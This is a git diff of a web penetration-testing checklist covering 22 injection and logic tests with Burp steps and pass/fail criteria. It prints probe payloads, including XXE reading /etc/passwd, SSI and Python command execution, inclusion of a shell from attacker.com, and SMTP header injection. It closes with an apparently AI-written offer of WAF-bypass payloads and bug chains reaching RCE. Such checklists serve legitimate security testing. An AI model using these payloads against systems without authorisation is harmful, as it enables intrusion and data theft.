@@ -2,117 +2,567 @@
 
 ---
 
-### 1. Cross-Site Scripting (XSS)
-* **Reflected XSS**
-    * **Test:** Inject `<script>alert(1)</script>` into search bars or URL parameters.
-    * **Tool:** Burp Suite (Repeater).
-    * **Clean Pass:** View the response body; `< >` must be converted to `&lt; &gt;`.
-* **Stored XSS**
-    * **Test:** Submit `<img src=x onerror=alert(1)>` in a comment or profile field.
-    * **Tool:** Burp Suite.
-    * **Clean Pass:** Refresh the page; the payload is either stripped or rendered as plain text.
-* **DOM-based XSS**
-    * **Test:** Use a URL fragment: `site.com/#<img src=x onerror=alert(1)>`. 
-    * **Tool:** DevTools (Console/Sources).
-    * **Clean Pass:** Trace the variable to the sink; verify it uses `.textContent` instead of `.innerHTML`.
-    
+# 🔁 1. Base Workflow (Repeat for ALL tests)
+
+### Step 1: Capture request
+
+* Burp Proxy ON → intercept request
+
+### Step 2: Send to Repeater
+
+* Right click → “Send to Repeater”
+
+### Step 3: Modify ONE parameter
+
+* Never test multiple at once
+
+### Step 4: Send → Observe:
+
+* Response body
+* Status code
+* UI (if stored)
 
 ---
 
-### 2. Injection Vulnerabilities
-* **SQL Injection**
-    * **Test:** Inject `' OR 1=1--` into login/search fields.
-    * **Tool:** Burp Suite.
-    * **Clean Pass:** Generic 200 OK (no results) or 403 error. No SQL syntax errors in the response.
-    
-* **LDAP Injection**
-    * **Test:** Inject `*)(| (uid=*` into directory searches.
-    * **Tool:** Burp Suite.
-    * **Clean Pass:** The query returns 0 results or an error because the `*` is treated as a literal character.
-* **XML Injection (XXE)**
-    * **Test:** Modify a POST request with `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
-    * **Tool:** Burp Suite.
-    * **Clean Pass:** The parser returns a "Forbidden Entity" error or ignores the DTD.
-* **XPath Injection**
-    * **Test:** Inject `' or '1'='1` into XML-based queries.
-    * **Tool:** Burp Suite.
-    * **Clean Pass:** The application returns an error or no data, neutralizing the quote.
-* **SSI Injection**
-    * **Test:** Inject `` into `.shtml` pages.
-    * **Tool:** cURL.
-    * **Clean Pass:** The string is reflected as a literal comment; no file list is generated.
-* **Code Injection**
-    * **Test:** Inject `phpinfo();` or `print(7*7)` into parameters passed to `eval()`.
-    * **Tool:** Burp Suite.
-    * **Clean Pass:** The input is treated as a string; no system info is displayed.
-* **Command Injection**
-    * **Test:** Inject `; whoami` or `| ping -c 1 [Your_IP]`.
-    * **Tool:** cURL.
-    * **Clean Pass:** The server ignores the semicolon and treats the rest as a literal IP address/filename.
+# 🟠 2. Reflected XSS
+
+### Tool:
+
+* Burp Repeater + Browser
+
+### Steps:
+
+1. Find reflected input:
+
+   * URL params, JSON fields
+2. Inject:
+
+```html
+"><script>alert(1)</script>
+```
+
+3. Send request
+4. Check response (Burp + browser)
+
+### PASS:
+
+* Output encoded (`&lt;script&gt;`)
+
+### FAIL:
+
+* Script executes immediately
 
 ---
 
-### 3. File & Logic Vulnerabilities
-* **File Inclusion (LFI/RFI)**
-    * **Test:** Request `?page=../../etc/passwd` or `?page=http://evil.com/shell.txt`.
-    * **Tool:** cURL.
-    * **Clean Pass:** Server returns 404/403. No system file content is rendered.
-* **Server-Side Template Injection (SSTI)**
-    * **Test:** Inject `${7*7}` or `{{7*7}}`.
-    * **Tool:** Burp Suite.
-    * **Clean Pass:** The page renders `${7*7}` literally; it does **not** render `49`.
-* **Mass Assignment**
-    * **Test:** Add `"is_admin": true` to a JSON update body.
-    * **Tool:** Burp Suite.
-    * **Clean Pass:** The response shows the user object updated *without* the elevated privilege.
+# 🟡 3. Stored XSS
+
+### Tool:
+
+* Burp Repeater + Browser
+
+### Steps:
+
+1. Inject payload:
+
+```html
+<svg/onload=alert(1)>
+```
+
+2. Send request
+3. Reload dashboard/page
+
+### PASS:
+
+* Rendered safely
+
+### FAIL:
+
+* Executes on page load (or other users)
 
 ---
 
-### 4. Protocol & Header Attacks
-* **HTTP Parameter Pollution (HPP)**
-    * **Test:** Send `?id=1&id=2`.
-    * **Tool:** Burp Suite.
-    * **Clean Pass:** The app consistently uses the first or last instance; no security filters are bypassed.
-* **HTTP Splitting / Smuggling**
-    * **Test:** Send requests with conflicting `Content-Length` and `Transfer-Encoding`.
-    * **Tool:** Burp Suite (Smuggler Extension).
-    * **Clean Pass:** The server returns a 400 Bad Request or rejects the ambiguous headers.
-* **Host Header Injection**
-    * **Test:** Change the `Host:` header to `evil.com`.
-    * **Tool:** Burp Suite.
-    * **Clean Pass:** Any redirects or password reset links still use the original, valid domain.
-* **IMAP/SMTP Injection**
-    * **Test:** Inject `\r\nBcc: test@evil.com` into mail forms.
-    * **Tool:** Burp Suite.
-    * **Clean Pass:** Newlines are stripped; only the intended recipient receives the mail.
+# 🔵 4. DOM-Based XSS
+
+### Tool:
+
+* Browser DevTools
+
+### Steps:
+
+1. Open DevTools → Sources
+2. Search:
+
+   * `innerHTML`
+   * `document.write`
+3. Inject payload in request:
+
+```html
+"><img src=x onerror=alert(1)>
+```
+
+4. Observe execution in browser
+
+### PASS:
+
+* No execution
+
+### FAIL:
+
+* JS executes via client-side rendering
 
 ---
 
-### 5. Advanced & Network Validation
-* **Server-Side Request Forgery (SSRF)**
-    * **Test:** Supply `http://169.254.169.254/` to a URL-fetcher.
-    * **Tool:** Burp Collaborator.
-    * **Clean Pass:** The server blocks the request; no DNS/HTTP interaction is recorded by Collaborator.
-    
-* **Format String Injection**
-    * **Test:** Inject `%x %x %s %n` into loggable fields.
-    * **Tool:** Burp Suite.
-    * **Clean Pass:** The application logs the literal string; no memory addresses are leaked.
-* **Overflow (Buffer/Stack/Heap/Integer)**
-    * **Test:** Send 100,000 "A"s or a number larger than `2,147,483,647`.
-    * **Tool:** cURL.
-    * **Clean Pass:** The app returns an error or truncates safely; it does **not** crash (500 error).
-* **HTTP Incoming Requests (Inspection)**
-    * **Test:** Monitor traffic for unencrypted sensitive data.
-    * **Tool:** Wireshark.
-    * **Clean Pass:** All sensitive tokens/creds are encrypted and not present in URLs.
-* **Incubated Vulnerabilities**
-    * **Test:** Inject a payload, then trigger it via a different process (e.g., a background task or Admin view).
-    * **Tool:** Burp Suite.
-    * **Clean Pass:** The payload remains encoded and inert when triggered in the second context.
+# 🟣 5. HTTP Parameter Pollution (HPP)
 
-### Summary for "Clean" Status
-To mark a test as **Pass**, you must confirm:
-1.  **Contextual Encoding:** Malicious characters are neutralized for the specific output.
-2.  **Strict Validation:** The server rejects the malformed request (400/403).
-3.  **Generic Errors:** No sensitive information (stack traces, DB versions) is disclosed.
+### Tool:
+
+* Burp Repeater
+
+### Steps:
+
+1. Duplicate parameters:
+
+```http
+dashboardid=402&dashboardid=999
+```
+
+OR in JSON:
+
+```json
+"dashboardid":"402",
+"dashboardid":"999"
+```
+
+2. Send request
+
+### Observe:
+
+* Which value is used?
+
+### PASS:
+
+* Proper validation / rejection
+
+### FAIL:
+
+* Filter bypass or logic confusion
+
+---
+
+# 🟢 6. SQL Injection
+
+### Tool:
+
+* Burp Repeater → sqlmap (optional)
+
+### Steps:
+
+1. Inject:
+
+```sql
+' OR 1=1--
+```
+
+2. Send request
+
+3. Observe:
+
+* Errors
+* Data changes
+
+### Confirm with:
+
+```bash
+sqlmap -r request.txt
+```
+
+### PASS:
+
+* No effect
+
+### FAIL:
+
+* Data leak / auth bypass
+
+---
+
+# 🟤 7. LDAP Injection
+
+### Tool:
+
+* Burp Repeater
+
+### Payload:
+
+```text
+*)(uid=*))(|(uid=*
+```
+
+### PASS:
+
+* No abnormal behavior
+
+### FAIL:
+
+* Auth bypass / data leak
+
+---
+
+# ⚪ 8. XML Injection
+
+### Tool:
+
+* Burp Repeater
+
+### Steps:
+
+1. If XML exists:
+
+```xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+```
+
+2. Send request
+
+### PASS:
+
+* Entity blocked
+
+### FAIL:
+
+* File content returned (XXE)
+
+---
+
+# ⚫ 9. SSI Injection
+
+### Payload:
+
+```html
+<!--#exec cmd="whoami" -->
+```
+
+### Tool:
+
+* Burp
+
+### PASS:
+
+* Output not executed
+
+### FAIL:
+
+* Server executes command
+
+---
+
+# 🔶 10. XPath Injection
+
+### Payload:
+
+```text
+' or '1'='1
+```
+
+### PASS:
+
+* Query unaffected
+
+### FAIL:
+
+* Auth bypass / data leak
+
+---
+
+# 🟠 11. IMAP / SMTP Injection
+
+### Tool:
+
+* Burp
+
+### Payload:
+
+```text
+\r\nBCC: attacker@mail.com
+```
+
+### PASS:
+
+* Ignored
+
+### FAIL:
+
+* Email manipulation
+
+---
+
+# 🔴 12. Code Injection
+
+### Payload:
+
+```python
+__import__('os').system('id')
+```
+
+### PASS:
+
+* Treated as string
+
+### FAIL:
+
+* Code execution
+
+---
+
+# 🟡 13. File Inclusion (LFI/RFI)
+
+### Payloads:
+
+```bash
+../../../../etc/passwd
+```
+
+```bash
+http://attacker.com/shell.txt
+```
+
+### Tool:
+
+* Burp
+
+### PASS:
+
+* Blocked
+
+### FAIL:
+
+* File contents returned
+
+---
+
+# 🟢 14. Command Injection
+
+### Payload:
+
+```bash
+; whoami
+&& id
+```
+
+### PASS:
+
+* No execution
+
+### FAIL:
+
+* Command output appears
+
+---
+
+# 🟣 15. Format String Injection
+
+### Payload:
+
+```text
+%s%s%s%s
+%x%x%x
+```
+
+### PASS:
+
+* No change
+
+### FAIL:
+
+* Memory leakage / crash
+
+---
+
+# ⚫ 16. HTTP Splitting / Smuggling
+
+### Tool:
+
+* Burp Repeater
+
+### Steps:
+
+Add:
+
+```http
+Transfer-Encoding: chunked
+Content-Length: 10
+```
+
+### PASS:
+
+* Normal response
+
+### FAIL:
+
+* Desync / weird responses
+
+---
+
+# ⚪ 17. Host Header Injection
+
+### Tool:
+
+* Burp
+
+### Modify:
+
+```http
+Host: attacker.com
+```
+
+or:
+
+```http
+X-Forwarded-Host: attacker.com
+```
+
+### PASS:
+
+* Ignored
+
+### FAIL:
+
+* Reflected in links / redirects
+
+---
+
+# 🔵 18. SSTI
+
+### Payload:
+
+```jinja2
+{{7*7}}
+```
+
+### PASS:
+
+* Output is literal
+
+### FAIL:
+
+* Evaluated (returns 49)
+
+---
+
+# 🟤 19. SSRF
+
+### Payload:
+
+```bash
+http://127.0.0.1
+http://169.254.169.254
+```
+
+### PASS:
+
+* Blocked
+
+### FAIL:
+
+* Internal access
+
+---
+
+# 🟠 20. Mass Assignment
+
+### Tool:
+
+* Burp
+
+### Add:
+
+```json
+"is_admin": true
+```
+
+### PASS:
+
+* Ignored
+
+### FAIL:
+
+* Privilege escalation
+
+---
+
+# 🔴 21. Overflow (Advanced)
+
+### Tool:
+
+* Burp Intruder
+
+### Steps:
+
+* Send very large input:
+
+```text
+AAAA....(10,000+ chars)
+```
+
+### PASS:
+
+* Handled safely
+
+### FAIL:
+
+* Crash / error
+
+---
+
+# ⚫ 22. Incubated Vulnerabilities (Time-Based)
+
+### Tool:
+
+* Burp + patience
+
+### Example:
+
+* Inject payload
+* Trigger later (admin panel, cron job)
+
+---
+
+# 🧠 Final Strategy (THIS is what makes it “clean”)
+
+### Use this order:
+
+1. XSS (fast, high impact)
+2. Injection (SQL, SSTI, command)
+3. Logic flaws (mass assignment, HPP)
+4. Infra (SSRF, smuggling)
+
+---
+
+# 🧾 Pro Tip (Real Pentester Mindset)
+
+Don’t just ask:
+
+> “Did payload work?”
+
+Ask:
+
+> “Where does this input go in the system?”
+
+* DB?
+* Template?
+* Shell?
+* API?
+
+👉 That tells you WHICH vulnerability to test.
+
+---
+
+# 🚀 If you want next level
+
+I can:
+
+* Map YOUR exact request → all injection points (line-by-line)
+* Give you **payloads that bypass WAFs**
+* Show **how to chain bugs into critical (RCE / account takeover)**
+
+Just tell me 👍
